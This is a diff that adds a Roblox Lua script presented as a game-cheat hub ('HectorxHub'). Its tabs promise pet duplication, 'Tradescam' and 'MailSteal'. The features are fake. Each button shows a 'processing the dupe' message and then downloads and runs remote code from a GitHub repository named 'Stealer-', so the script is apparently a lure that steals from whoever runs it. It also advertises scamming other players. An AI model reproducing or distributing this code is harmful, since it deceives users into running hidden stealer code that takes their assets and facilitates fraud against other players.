@@ -1,0 +1,185 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "HectorxHub🍌", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+
+
+
+local Tab = Window:MakeTab({
+    Name = "Huge",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddTextbox({
+    Name = "From Pet",
+    Default = "Cat",
+    TextDisappear = true,
+    Callback = function(Value)
+        
+        print(Value)
+    end      
+})
+
+Tab:AddTextbox({
+    Name = "To Pet",
+    Default = "Huge",
+    TextDisappear = true,
+    Callback = function(Value)
+       
+        print(Value)
+    end      
+})
+
+Tab:AddButton({
+    Name = "Changed",
+    Callback = function()
+           local message = require(game.ReplicatedStorage.Library.Client.Message)
+        message.Error("PLEASE WAIT WHILE WE ARE PROCESSING THE DUPE")
+        wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
+        print("button pressed")
+      end    
+})
+
+local Tab = Window:MakeTab({
+    Name = "Titanic",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddTextbox({
+    Name = "From Pet",
+    Default = "Cat",
+    TextDisappear = true,
+    Callback = function(Value)
+        
+        print(Value)
+    end      
+})
+
+Tab:AddTextbox({
+    Name = "To Pet",
+    Default = "Titanic",
+    TextDisappear = true,
+    Callback = function(Value)
+       
+        print(Value)
+    end      
+})
+
+Tab:AddButton({
+    Name = "Changed",
+    Callback = function()
+           local message = require(game.ReplicatedStorage.Library.Client.Message)
+        message.Error("PLEASE WAIT WHILE WE ARE PROCESSING THE DUPE")
+        wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
+        print("button pressed")
+      end    
+})
+
+local Tab = Window:MakeTab({
+    Name = "Dupe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddTextbox({
+    Name = "Dupe Huges",
+    Default = "Huge",
+    TextDisappear = true,
+    Callback = function(Value)
+        
+        print(Value)
+    end      
+})
+
+Tab:AddTextbox({
+    Name = "Dupe Titanics",
+    Default = "Dupe",
+    TextDisappear = true,
+    Callback = function(Value)
+       
+        print(Value)
+    end      
+})
+
+Tab:AddButton({
+    Name = "Changed",
+    Callback = function()
+           local message = require(game.ReplicatedStorage.Library.Client.Message)
+        message.Error("PLEASE WAIT WHILE WE ARE PROCESSING THE DUPE")
+        wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
+        print("button pressed")
+      end    
+})
+
+local Tab = Window:MakeTab({
+    Name = "Tradescam",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddTextbox({
+    Name = "Select Player",
+    Default = "name",
+    TextDisappear = true,
+    Callback = function(Value)
+        
+        print(Value)
+    end      
+})
+
+Tab:AddTextbox({
+    Name = "Put Rap Number",
+    Default = "Rap",
+    TextDisappear = true,
+    Callback = function(Value)
+       
+        print(Value)
+    end      
+})
+
+Tab:AddButton({
+    Name = "Continue",
+    Callback = function()
+           local message = require(game.ReplicatedStorage.Library.Client.Message)
+        message.Error("PLEASE WAIT WHILE WE ARE PROCESSING THE DUPE")
+        wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
+        print("button pressed")
+      end    
+})
+
+local Tab = Window:MakeTab({
+    Name = "MailSteal",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddTextbox({
+    Name = "Type Player Name",
+    Default = "Name",
+    TextDisappear = true,
+    Callback = function(Value)
+        
+        print(Value)
+    end      
+})
+
+Tab:AddTextbox({
+    Name = "Player Rap",
+    Default = "Rap",
+    TextDisappear = true,
+    Callback = function(Value)
+       
+        print(Value)
+    end      
+})
+
+Tab:AddButton({
+    Name = "Continue",
+    Callback = function()
+           local message = require(game.ReplicatedStorage.Library.Client.Message)
+        message.Error("PLEASE WAIT WHILE WE ARE PROCESSING THE DUPE")
+        wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
+        print("button pressed")
+      end    
+})
